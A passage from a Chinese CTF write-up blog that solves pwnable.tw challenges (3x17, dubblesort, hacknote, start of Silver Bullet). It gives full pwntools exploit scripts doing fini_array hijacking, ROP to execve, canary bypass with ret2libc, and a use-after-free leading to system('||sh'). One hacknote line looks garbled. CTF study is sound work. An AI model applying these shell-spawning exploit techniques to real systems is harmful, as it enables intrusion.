<p>.init<br>.init_array<br>.fini<br>.fini_array</p>
</blockquote>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/3x173.jpg" alt="3x173" title="">
                </div>
                <div class="image-caption">3x173</div>
            </figure></div>

<p>其中<code>.init和.fini</code>点进去是函数，<code>.init_array和.fini_array</code>点进去是数组</p>
<p>而且我们有:</p>
<blockquote>
<p>__libc_csu_init执行.init和.init_array<br>__libc_csu_fini执行.fini和.fini_array</p>
</blockquote>
<p>并且执行顺序为</p>
<blockquote>
<p>__libc_csu_init<br>main<br>__libc_csu_fini</p>
</blockquote>
<p>进一步说，为</p>
<blockquote>
<p>.init<br>.init_array[0]<br>.init_array[1]<br>…<br>.init_array[n]<br>main<br>.fini_array[n]<br>…<br>.fini_array[1]<br>.fini_array[0]<br>.fini</p>
</blockquote>
<p>所以如果我们将<code>.fini_array[1]</code>覆盖为<code>main</code>，<code>.fini_array[0]</code>覆盖为<code>__libc_csu_fini</code>的时候，我们就可以一直循环写了</p>
<p>而且由于变量<code>byte_4B9330</code>为byte类型，则它可以溢出重新回到1，然后我们可以继续写，即它并无任何影响</p>
<p>则首先实现无限任意写:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = process(<span class="string">'./3x17'</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x = <span class="number">2048</span> : r.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : r.recvline()</span><br><span class="line">ia = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">ra = <span class="keyword">lambda</span> : r.recvall()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: r.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y : r.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line">fini_array_addr = <span class="number">0x4B40F0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,value)</span>:</span></span><br><span class="line">	ru(<span class="string">'addr:'</span>)</span><br><span class="line">	sl(str(addr))</span><br><span class="line">	ru(<span class="string">'data:'</span>)</span><br><span class="line">	sl(str(value))</span><br><span class="line"></span><br><span class="line">payload = p64(fini_addr) + p64(main_addr)</span><br><span class="line">write(fini_array_addr,payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>然后我们需要自己写shellcode或者ROP，但是我们不知道栈地址，所以我们需要利用点技巧</p>
<p>我们看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br></pre></td></tr></table></figure>

<p>其中<code>off_4B40F0</code>为<code>.fini_array</code>，<code>[rbp+rbx*8+0]</code>指向<code>fini_array</code>的函数，其中<code>rbp</code>的值先是被压入了栈中，然后将定值<code>0x4b40f0</code>赋给了rbp</p>
<p>那么如果我们把函数劫持到一个地方，满足下面的条件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea     rbp, off_4B40F0 ; rbp = 0x4b40f0            , rsp = 未知</span><br><span class="line"></span><br><span class="line">; 劫持到这</span><br><span class="line">mov     rsp,rbp         ; rbp = 0x4b40f0            , rsp = 0x4b40f0</span><br><span class="line">pop     rbp             ; rbp = [rsp] = [0x4b40f0]  , rsp = 0x4b40f8</span><br><span class="line">ret                     ; rip = [rsp] = [0x4b40f8]  , rsp = 0x4b4100</span><br></pre></td></tr></table></figure>

<p>则rsp被劫持到0x4b4100，rip和rbp分别为.fini_array[1]和.fini_array[0]的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">low  addr          0x4b40f0 +----------------+</span><br><span class="line">                            |                |</span><br><span class="line">                            |                |</span><br><span class="line">                            | .fini_array[0] |</span><br><span class="line">                            |     (rbp)      |</span><br><span class="line">                            |                |</span><br><span class="line">                   0x4b40f8 +----------------+</span><br><span class="line">                            |                |</span><br><span class="line">                            |                |</span><br><span class="line">                            | .fini_array[1] |</span><br><span class="line">                            |     (rip)      |</span><br><span class="line">                            |                |</span><br><span class="line">        rsp +----&gt; 0x4b4100 +----------------+ +-+</span><br><span class="line">                            |                |</span><br><span class="line">                            |                |  +</span><br><span class="line">                            |                |  |</span><br><span class="line">                            |                |  |</span><br><span class="line">                            | .data.rel.ro   |  | rop chain</span><br><span class="line">                            | (read/write)   |  |</span><br><span class="line">                            |                |  |</span><br><span class="line">                            |                |  |</span><br><span class="line">                            |                |  |</span><br><span class="line">                            |                |  v</span><br><span class="line">                            |                |</span><br><span class="line">  high addr                 +----------------- +-+</span><br></pre></td></tr></table></figure>

<p>那么我们只需要</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.布置好从0x4b4100开始的栈空间(利用任意地址写)</span><br><span class="line">2.保证.fini_array[1]指向的代码不破坏栈结构，还有个ret，或者直接就一句ret也行</span><br><span class="line">3.通过上文类似的方法劫持rsp到0x4b4100，即可触发ROP</span><br></pre></td></tr></table></figure>

<p>对于第一点，我们可以用ROPgadget来布置<code>0x4b4100</code>开始的栈空间</p>
<p>对于第二点，由于我们的<code>.fini_array[1]</code>为<code>main</code>·，并不破坏栈结构，所以不用修改</p>
<p>对于第三点，由于main函数最后有<code>leave;retn;</code>，其中leave相当于<code>mov rsp,rbp;pop rbp</code>，那么我们只需要把<code>.fini_array</code>改为该地址即可</p>
<p>需要注意的是，64位的execve应满足</p>
<blockquote>
<p>首先查到execve在64位的上的系统调用号是0x3b，所以要控制rax为0x3b<br>控制rdi为’/bin/sh\x00’的地址<br>控制rsi和rdx均为0<br>64位下系统调用的指令为syscall而不是int 80</p>
</blockquote>
<h2 id="解题脚本-3"><a href="#解题脚本-3" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># r = process('./3x17')</span></span><br><span class="line">r = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x = <span class="number">2048</span> : r.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : r.recvline()</span><br><span class="line">ia = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">ra = <span class="keyword">lambda</span> : r.recvall()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: r.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y : r.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line">fini_array_addr = <span class="number">0x4B40F0</span></span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x401C4B</span></span><br><span class="line"></span><br><span class="line">esp = <span class="number">0x4B4100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,value)</span>:</span></span><br><span class="line">	ru(<span class="string">'addr:'</span>)</span><br><span class="line">	sd(str(addr))</span><br><span class="line">	ru(<span class="string">'data:'</span>)</span><br><span class="line">	sd(str(value))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get write times</span></span><br><span class="line">write(fini_array_addr,p64(fini_addr) + p64(main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line">pop_ret_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_ret_rdi = <span class="number">0x401696</span></span><br><span class="line">pop_ret_rdx = <span class="number">0x446e35</span></span><br><span class="line">pop_ret_rsi = <span class="number">0x406c30</span></span><br><span class="line">syscall = <span class="number">0x4022b4</span></span><br><span class="line">bin_sh_addr = <span class="number">0x4B45C0</span></span><br><span class="line"></span><br><span class="line">write(bin_sh_addr,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">key = [pop_ret_rax,<span class="number">0x3b</span>,pop_ret_rdi,bin_sh_addr	,pop_ret_rdx,<span class="number">0</span>,pop_ret_rsi,<span class="number">0</span>,syscall]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">	write(esp+i*<span class="number">8</span>,p64(key[i]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get shell</span></span><br><span class="line">write(fini_array_addr,p64(leave_ret_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>Sort the memory!<br>nc chall.pwnable.tw 10101</p>
</blockquote>
<h2 id="基本信息-4"><a href="#基本信息-4" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort0.jpg" alt="dubblesort0" title="">
                </div>
                <div class="image-caption">dubblesort0</div>
            </figure></div>

<p>checksec一下，保护全开</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort1.jpg" alt="dubblesort1" title="">
                </div>
                <div class="image-caption">dubblesort1</div>
            </figure></div>

<p>ida打开如下：</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort2.jpg" alt="dubblesort2" title="">
                </div>
                <div class="image-caption">dubblesort2</div>
            </figure></div>

<h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>题目输入名字处如果输入回车则会泄露处canary（需要注意的是接收字节的时候需要把最后的0a改为00）</p>
<p>并且由于输入的排序的数字的个数没有限制，因此我们也就可以改栈上的数据</p>
<p>如果在输入数字的时候输入别的字符，例如s，则这个位置之后的数据都不会被修改，但是会被打印出来</p>
<p>如果我们输入的数字为<code>+/-</code>，则栈上的数据不会改变</p>
<p>由于我们有libc，则我们可以用ret2libc来getshell</p>
<p>我们发现，在name后24个字节处有一个疑似libc中的地址<code>0xf7f9800a</code></p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort3.jpg" alt="dubblesort3" title="">
                </div>
                <div class="image-caption">dubblesort3</div>
            </figure></div>

<p>之后vmmap查看libc的起始地址，发现为<code>0xf7dc0000</code></p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort4.jpg" alt="dubblesort4" title="">
                </div>
                <div class="image-caption">dubblesort4</div>
            </figure></div>

<p>那么偏移就为<code>0xf7f9800a-0xf7dc0000=0x1d8000</code>，我们用readelf查看本地的libc也可以发现是这个偏移</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort5.jpg" alt="dubblesort5" title="">
                </div>
                <div class="image-caption">dubblesort5</div>
            </figure></div>

<p>由于题目给了libc，我们查看之后发现偏移不太一样，偏移为<code>0x1b0000</code>，之后我们利用的时候要小心</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort6.jpg" alt="dubblesort6" title="">
                </div>
                <div class="image-caption">dubblesort6</div>
            </figure></div>

<h2 id="解题脚本-4"><a href="#解题脚本-4" class="headerlink" title="解题脚本"></a>解题脚本</h2><p>有时候会失败应该是canary比sys_addr大导致的，多试试就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"chall.pwnable.tw"</span></span><br><span class="line">PORT = <span class="number">10101</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process('./dubblesort')</span></span><br><span class="line">r = remote(HOST,PORT)</span><br><span class="line">libc = ELF(<span class="string">'libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x = <span class="number">2048</span> : r.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : r.recvline()</span><br><span class="line">ia = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">ra = <span class="keyword">lambda</span> : r.recvall()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: r.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y : r.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x1b0000</span></span><br><span class="line">local_offset = <span class="number">0x1d8000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(value)</span>:</span></span><br><span class="line">	ru(<span class="string">'number :'</span>)</span><br><span class="line">	sl(value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get libc_base</span></span><br><span class="line">ru(<span class="string">'name :'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">24</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'Hello '</span>)</span><br><span class="line">ru(payload)</span><br><span class="line">libc_base = (u32(rv(<span class="number">4</span>)) ^ <span class="number">0xa</span> ) </span><br><span class="line">libc_base -= libc_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Get libc_base: '</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get sys_addr and bin_sh_addr</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line">sys_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Get sys_addr: '</span>+hex(sys_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Get bin_sh_addr: '</span>+hex(bin_sh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write len</span></span><br><span class="line">ru(<span class="string">'sort :'</span>)</span><br><span class="line">sl(<span class="string">'35'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write padding</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">	write(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write canary</span></span><br><span class="line">write(<span class="string">'+'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write sys_addr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">	write(str(sys_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write bin_sh_addr</span></span><br><span class="line">write(str(bin_sh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>A good Hacker should always take good notes!<br>nc chall.pwnable.tw 10102</p>
</blockquote>
<h2 id="基本信息-5"><a href="#基本信息-5" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接，开了cannary，NX和Partial RELRO，没开PIE</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote0.jpg" alt="hacknote0" title="">
                </div>
                <div class="image-caption">hacknote0</div>
            </figure></div>

<p>题目是个堆题，有add，delete和print</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote1.jpg" alt="hacknote1" title="">
                </div>
                <div class="image-caption">hacknote1</div>
            </figure></div>

<p>add可以是任意大小，最多五个chunk</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote2.jpg" alt="hacknote2" title="">
                </div>
                <div class="image-caption">hacknote2</div>
            </figure></div>

<p>delete中free后没有把指针置空，结合print就是UAF</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote3.jpg" alt="hacknote3" title="">
                </div>
                <div class="image-caption">hacknote3</div>
            </figure></div>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote4.jpg" alt="hacknote4" title="">
                </div>
                <div class="image-caption">hacknote4</div>
            </figure></div>

<h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>由于add一次会增加一个0x20和指定大小+0x10的堆块，所以可以申请两个大于0x10的堆块</p>
<p>然后free掉，再申请个0x10的堆块，造成UAF，申请的时候填入atoi的got表地址，泄露libc</p>
<p>最后用同样的方法system(‘||sh’)即可</p>
<h2 id="解题脚本-5"><a href="#解题脚本-5" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">'./hacknote'</span></span><br><span class="line"><span class="comment">#r = process(p)</span></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10102</span>)</span><br><span class="line">elf = ELF(p)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(idx)</span>:</span></span><br><span class="line">	r.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	r.send(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">	r.send(str(size))</span><br><span class="line">	r.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">	r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	r.send(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	r.send(str(idx))</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x804A050</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'c'</span>*<span class="number">0x80</span>)atoi()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x0804862b</span>) + p32(atoi_got))</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(r.recvuntil(<span class="string">'\x0a'</span>,drop=<span class="keyword">True</span>)[:<span class="number">4</span>]) - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(system)+<span class="string">'||sh'</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Silver-Bullet"><a href="#Silver-Bullet" class="headerlink" title="Silver Bullet"></a>Silver Bullet</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>Please kill the werewolf with silver bullet!<br>nc chall.pwnable.tw 10103</p>
</blockquote>
<h2 id="基本信息-6"><a href="#基本信息-6" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接，开了NX和Full RELRO</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet0.jpg" alt="silver_bullet0" title="">
                </div>
                <div class="image-caption">silver_bullet0</div>
            </figure></div>

<p>题目是个栈题，三个选项</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet1.jpg" alt="silver_bullet1" title="">
                </div>
                <div class="image-caption">silver_bullet1</div>
            </figure></div>

<p>选项1是create_bullet，添加不超过0x30的数据，其中数据长度会保存在数据的后面，都在栈上，且后面就是ebp和返回地址</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet2.jpg" alt="silver_bullet2" title="">
                </div>
                <div class="image-caption">silver_bullet2</div>
            </figure></div>

